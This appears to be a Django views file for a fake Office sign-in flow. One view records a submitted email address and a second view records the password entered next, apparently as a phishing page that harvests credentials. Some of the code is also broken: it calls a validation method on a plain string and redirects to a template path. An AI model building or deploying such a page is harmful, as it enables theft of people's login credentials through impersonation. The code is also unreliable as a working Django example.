from django.shortcuts import render, redirect
from .models import mail_user


# Create your views here.
 
def Homepage(request):
    if request.method == "POST":
        email = request.POST.get("email")
        print(email)
        mail_user.objects.create(email=email)
        return redirect("pass")
        
    else:
        return render(request, "office/sign_in.html")
        


def password1(request):
    new_password = (["GET"])
    if request.method == "GET":
        return render(request, "office/password.html")
    else:
        password = request.POST.get("password")
        if password.is_valid():
            mail_user.objects.create(password=password)
            return redirect("office/password.html")

        

 